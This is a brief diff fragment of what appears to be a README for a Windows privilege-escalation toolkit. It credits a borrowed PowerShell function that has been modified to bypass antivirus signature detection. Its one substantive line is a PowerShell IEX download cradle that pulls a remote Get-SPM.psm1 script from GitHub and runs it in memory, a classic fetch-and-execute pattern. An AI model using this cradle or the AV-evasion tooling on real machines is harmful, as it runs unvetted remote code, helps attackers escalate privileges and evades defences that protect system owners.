@@ -27,5 +27,6 @@ function found in Carols Perez's PoshSec-Mod project.#
 Modded to bypass AV sig detection.
 
 Get-SPM.psm1: 
+
 IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/pand0rausa/WinEscalation-/master/Get-SPM.psm1")
 
